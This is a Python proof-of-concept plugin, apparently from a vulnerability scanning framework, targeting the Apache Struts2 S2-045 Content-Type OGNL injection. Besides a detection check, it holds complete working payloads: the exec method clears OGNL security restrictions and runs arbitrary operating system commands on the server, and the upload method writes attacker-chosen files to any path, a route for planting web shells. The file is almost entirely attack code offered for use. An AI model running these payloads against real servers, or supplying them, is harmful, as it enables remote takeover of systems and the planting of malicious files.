#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'Struts2-045'
        self.keyword = ['struts2', 'java']
        self.info = 'Struts2-045'
        self.type = 'rce'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        self.get_url()
        if self.url != None:
            try:
                headers = {}
                headers["Content-Type"] = "%{#context['co'+'m.ope'+'nsympho'+'ny.xw'+'ork2.di'+'spatch'+'er.Htt'+'pServl'+'etResponse'].addHeader('header_str2045','header_str2045'+'_'+'multipart/form-data')}"
                res = self.curl('get',self.url,headers = headers)
                if res.headers['header_str2045'] == 'header_str2045_multipart':
                    self.flag = 1
                    self.req.append({"headers":headers})
                    self.res.append({"info": self.url, "key": "header_str2045"})
            except:
                pass

    def exec(self):
        self.get_url()
        if self.url != None:
            cmd = self.parameter['cmd']
            headers = {}
            headers["Content-Type"] = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#s=new java.util.Scanner((new java.lang.ProcessBuilder('%COMMAND%'.toString().split('\\\\s'))).start().getInputStream()).useDelimiter('\\\\AAAA')).(#str=#s.hasNext()?#s.next():'').(#res.getWriter().print(#str)).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())}".replace("%COMMAND%",cmd)
            try:
                content = self.curl('get',self.url,headers = headers).content
                self.flag = 1
                self.req.append({"headers": headers})
                self.res.append({"info": content,"key":cmd})
            except:
                pass


    def upload(self):
        self.get_url()
        if self.url != None:
            despath = self.parameter['despath']
            srcpath = self.parameter['srcpath']
            content = self.read_file(srcpath['srcpath'])
            headers = {}
            headers["Content-Type"] = """%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#fs=new java.io.FileOutputStream("%PATH%")).(#out=#res.getOutputStream()).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),#fs)).(#fs.close()).(#out.print('oko')).(#out.print('kok/')).(#out.print(#req.getContextPath())).(#out.close())}""".replace("%PATH%", despath).replace("%FILECONTENT%", content)
            try:
                self.curl('get',self.url,headers = headers)
                self.flag = 1
                self.req.append({"headers": headers})
                self.res.append({"info": self.url,"key":'upload'})
            except:
                pass